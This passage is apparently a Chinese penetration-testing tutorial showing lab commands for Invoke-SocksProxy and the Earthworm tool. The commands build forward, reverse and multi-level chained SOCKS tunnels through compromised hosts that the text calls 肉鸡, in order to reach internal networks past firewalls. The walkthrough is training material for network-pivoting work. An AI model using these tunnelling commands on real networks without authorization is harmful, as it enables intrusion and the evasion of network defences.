输入Invoke-SocksProxy -bindPort 1234 在端口1234上创建socks代理
接下来在Win7上使用socks代理软件，通过Win10的1234端口进行外网访问
这次我是用的软件是sockscap,当然Proxychains肯定也行
点击文件选择“设置”设置socks服务器IP和端口，点击应用，确定
点击新建，选择需要通过代理的程序，我这里选择的火狐浏览器
点击运行，我们访问百度
在W10主机，窗口可以看到，已经连接成功了
### Invoke-SocksProxy使用方法二
增加线程方式，输入Invoke-SocksProxy -bindPort 1234 -threads 400
如果不加-bindPort默认端口1080
## 0x06 Earthworm
EW 是一套便携式的网络穿透工具，具有 SOCKS  
v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透
注:此工具已停止更新、下载
### Earthworm用法
下图是一张示意图:
该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。
工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux  
均被包括其内，更多平台的支持还在维护中，敬请期待。
使用方法：
以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.
该工具共有 6  
种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。
  1. 正向 SOCKS v5 服务器
\$ ./ew -s ssocksd -l 1080
  1. 反弹 SOCKS v5 服务器
这个操作具体分两步：
a) 先在一台具有公网 ip 的主机A上运行以下命令：
\$ ./ew -s rcsocks -l 1080 -e 8888
b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
\$ ./ew -s rssocks -d 1.1.1.1 -e 8888
成功。
  1. 多级级联
工具中自带的三条端口转发指令，它们的参数格式分别为：
\$ ./ew -s lcx_listen -l 1080 -e 8888
\$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
\$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。
首先提供两个“二级级联”本地SOCKS测试样例：
a) lcx_tran 的用法
\$ ./ew -s ssocksd -l 9999
\$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
b) lcx_listen、lcx_slave 的用法
\$ ./ew -s lcx_listen -l 1080 -e 8888
\$ ./ew -s ssocksd -l 9999
\$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
再提供一个“三级级联”的本地SOCKS测试用例以供参考
\$ ./ew -s rcsocks -l 1080 -e 8888
\$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
\$ ./ew -s lcx_listen -l 9999 -e 7777
\$ ./ew -s rssocks -d 127.0.0.1 -e 7777
数据流向: SOCKS v5 -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks
注: 以上内容来源参考自官网或者工具里面的Readme
### Earthworm使用方法一【正向代理】
> Win7 主机ip:192.168.192.1
>
> Win7 主机 ip:192.168.192.9
目标网络边界存在公网IP且可任意开监听端口：
+---------+ +-------------------+
|HackTools| ->> | 7777-> 192.168.192.9 |
+---------+ +-------------------+
执行：ew_for_win_32.exe -s ssocksd -l 7777
意思是：在 w7 192.168.192. 9 主机上通过这个命令开启 7777 端口的 socks 代理
接下来可以使用sockscap或者  
Proxychains等工具访问代理端口，因为之前提过用法我就不墨迹了，直接放演示截图
注：此属于正向代理，代理的是黑客客户端，连接的是肉鸡相当于服务器
### Earthworm使用方法二【反向代理】
> Win7 x32 主机ip:192.168.0.75 【hack机】
>
> Win7 主机 ip:192.168.0.226 【公网机】
>
> Win7 主机 ip:192.168.192.9 【内网机】
目标网络边界不存在公网 IP，需要通过反弹方式创建 socks 代理
192.168.192.9 一台可控公网IP主机 可控内网主机
+---------+ +--------------------------+ | +---------------+
|HackTools| ->> | 1089 ->192.168.0.226 -> 9999 | 防火墙 | **\  Win7 主机ip:192.168.192.1 【hack机】
>
> Win7 主机 ip:192.168.192.9 【A】
>
> Win7 主机 ip:192.168.192.11 【B】
获得目标网络内两台主机 A、B 的权限，情况描述如下：
A 主机： 存在公网 IP，且自由监听任意端口，无法访问特定资源
B 主机： 目标网络内部主机，可访问特定资源，但无法访问公网
A 主机可直连 B 主机
可控边界主机A 可访问指定资源的主机B
+---------+ +-----------------------+ +----------------
|HackTools| ->> | 1099 -->192.168.192.9 --> | ->> |7777 ->  
192.168.192.11 |
+---------+ +-----------------------+ +-----------------+
在B主机上执行：ew_for_win_32.exe -s ssocksd -l 7777
意思是：在B主机上利用 ssocksd 方式启动 7777 端口的 socks 代理
在主机A上执行：ew_for_win_32.exe -s lcx_tran -l 1099 -f 192.168.192.11 -g 7777
/意思是将 1080 端口收到的 socks 代理请求转交给B主机的7777端口。
接下来可以用通过访问 sockscap或者 Proxychains等工具192.168.192.9:1099 端口使用  
rssocks 主机提供的 socks5 代理服务
代理成功截图：
### Earthworm使用方法四
> Win7 主机ip:192.168.192.1 【hack机】
>
> Win7 主机 ip:192.168.192.9 【A】
>
> Win7 主机 ip:192.168.192.10 【公网机】
>
> Win7 主机 ip:192.168.192.13 【B】
获得目标网络内两台主机 A、B 的权限，情况描述如下：
A 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。
B 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。
A 主机可直连 B 主机
  1. 在公网机上执行：ew_for_win_32.exe -s lcx_listen -l 1099 -e 8888
意思是：在 192.168.192.10 公网IP主机添加转接隧道，将 1080  
收到的代理请求，转交给反连 8888 端口的主机
  1. 在主机B上执行：ew_for_win_32.exe -s ssocksd -l 9999
意思是：在 192.168.192.13 【B】主机上利用 ssocksd 方式启动 9999 端口的 socks  
代理
  1. 在主机A上执行：ew_for_win_32.exe -s lcx_slave -d 192.168.192.10 -e 8888 -f  
192.168.192.13 -g 9999
意思是：在 192.168.192.9 上，通过工具的 lcx_slave 方式，打通192.168.192.10:8888  
和 192.168.192.13:9999 之间的通讯隧道
  1. HackTools 可通过访问192.168.192.10:1099 来使用 192.168.192.13 主机提供的  
socks5 代理
成功截图：
B的
> 公网机的
> A的
> Hack机
> 注：红色正常我代理机B上不了外网
### Earthworm总结
目前工具提供六种链路状态，可通过 -s 参数进行选定，分别为:
ssocksd rcsocks rssocks
lcx_slave lcx_tran lcx_listen
其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks  
提供，分别对应正向与反向socks代理。
其余的 lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。
lcx 类别管道
lcx_slave 该管道一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。
lcx_tran 该管道，通过监听本地端口接收代理请求，并转交给代理提供主机。
lcx_listen  
该管道，通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。
通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。
####
注：这个是之前个人写的总结，修了一下内容和图片分享了出来，很多诸如frp、ngrok等工具并没有总结进去；另如有问题希望各位大佬不吝赐教，不要喷小弟